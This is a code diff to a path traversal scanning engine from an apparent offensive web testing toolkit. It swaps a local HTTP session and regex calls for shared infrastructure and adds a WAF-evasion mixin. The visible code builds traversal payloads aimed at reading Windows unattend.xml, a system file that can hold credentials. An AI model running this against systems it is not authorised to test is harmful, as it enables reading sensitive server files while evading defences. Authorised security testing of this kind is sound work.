@@ -26,6 +26,9 @@ import threading
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
+from core.shared_infra import shared_session, regex_cache, PayloadInjector, WAFEvasionMixin
+from core.var import USER_AGENTS, DEFAULT_TIMEOUT
+
 # ============================================================================
 # ANSI COLOR CODES (Termux-compatible)
 # ============================================================================
@@ -294,7 +297,7 @@ TRAVERSAL_PARAM_NAMES = [
 ]
 
 
-class PathTraversalEngine:
+class PathTraversalEngine(WAFEvasionMixin):
     """Path Traversal Engine - Fused from PTScanner + PayloadsAllTheThings"""
 
     def __init__(self, target_url=None, parameter=None, method="GET", data=None,
@@ -308,13 +311,7 @@ class PathTraversalEngine:
         self.proxy = proxy
         self.timeout = timeout
         self.threads = threads
-        self.session = requests.Session()
-        self.session.verify = False
-        self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36'
-        })
-        if proxy:
-            self.session.proxies = {'http': proxy, 'https': proxy}
+        self.session = shared_session
         self.findings = []
         self.lock = threading.Lock()
 
@@ -369,7 +366,7 @@ class PathTraversalEngine:
             if file_type and sig_name != file_type:
                 continue
             for pattern in patterns:
-                if re.search(pattern, text, re.IGNORECASE | re.MULTILINE):
+                if regex_cache.search(pattern, text, re.IGNORECASE | re.MULTILINE):
                     matches.append(sig_name)
                     break
         return list(set(matches))
@@ -382,7 +379,7 @@ class PathTraversalEngine:
 
     def _try_base64_decode(self, content):
         """Attempt to extract and decode base64 content from response"""
-        b64_match = re.search(r'[A-Za-z0-9+/]{20,}={0,2}', content)
+        b64_match = regex_cache.search(r'[A-Za-z0-9+/]{20,}={0,2}', content)
         if b64_match:
             try:
                 decoded = base64.b64decode(b64_match.group()).decode('utf-8', errors='ignore')
@@ -1126,7 +1123,7 @@ class PathTraversalEngine:
                 payload = self._build_traversal(depth, "C:/Windows/Panther/unattend.xml", "..\\")
                 resp = self._inject_payload_raw(payload, parameter)
                 if resp and resp.status_code == 200:
-                    version_match = re.search(r'<osimage>(.*?)</osimage>', resp.text, re.IGNORECASE)
+                    version_match = regex_cache.search(r'<osimage>(.*?)</osimage>', resp.text, re.IGNORECASE)
                     if version_match:
                         results["details"]["windows_version"] = version_match.group(1)[:200]
                     break
